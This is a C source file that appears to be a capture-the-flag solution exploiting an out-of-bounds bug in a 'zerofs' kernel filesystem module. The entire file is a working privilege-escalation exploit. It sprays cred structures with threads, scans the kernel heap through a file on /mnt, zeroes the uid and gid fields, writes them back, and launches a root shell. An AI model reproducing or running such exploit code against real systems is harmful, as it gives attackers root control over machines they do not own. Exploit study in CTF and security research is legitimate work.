/*************************************************************
 * File Name: exp.c
 * 
 * Created on: 2019-11-02 21:09:40
 * Author: raycp
 * 
 * Last Modified: 2019-11-04 03:57:39
 * Description: oob in zerofs, burete to find struct and write 0 to escalate privilege
************************************************************/

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>

#define UID 1000

void die(const char* msg)
{
    perror(msg);
    _exit(-1);        
}

void check_win(uint32_t i)
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            printf("root at thread: %d\n",i);
            execl("/bin/sh", "sh", NULL);
            exit(0);
        }
    }
}

int main()
{
    int i, j, k, r;
    unsigned long max_i = 0;
    int count = 0;
    int fd = open("/mnt/666",  O_RDWR);

    if(fd == -1){
        die("[-] open file error");               
    }

    pthread_t t;
    
    // step 1 spray struct cred first
    for (i = 0; i < 256; i++)
        pthread_create(&t, NULL, &check_win, i+1);

    // step 2 kernel heap out of boud to find struct cred.
    unsigned int *ibuf = (unsigned int *)malloc(0x100000);
    for(k=0; k<0x10000000/0x100000; k++ ){
        count = 0;
        r = lseek(fd, k * 0x100000, SEEK_SET);
        if (r < 0) {
            die("[-] lseek error");                               
        }
        r = read(fd, ibuf, 0x100000);
        if (r < 0) {
            die("[-] read error");                               
        }
        for(i = 0; i < 0x100000/4; i++) {
            // judge struct cred by UID equal to 1000
            if (ibuf[i] == UID &&  ibuf[i+6]== UID && ibuf[i+12] == UID && ibuf[i+25] == UID && ibuf[i+39] == UID && ibuf[i+24] == UID){

                printf("[+] got cred at offset: 0x%x\n", k*0x100000+i);
                // set uid gid to 0 to achieve privilege escalation
                max_i = i+40;
                ibuf[i] = 0;
                ibuf[i+6] = 0;
                ibuf[i+12] = 0;
                ibuf[i+25] = 0;
                ibuf[i+39] = 0;
                ibuf[i+24] = 0;
                count++;
                if(count >= 2) {
                    break;
                }
            }
             
            
            

        }

        if(count >=2 ){
            break;
        }

    }

    // step 3 out of bound to write heap data back to escalate privilege
    lseek(fd, k*0x100000, SEEK_SET);
    write(fd, ibuf, max_i*4);

    printf("[+] waiting root shell...\n");
    check_win(0);

    return 0;

}





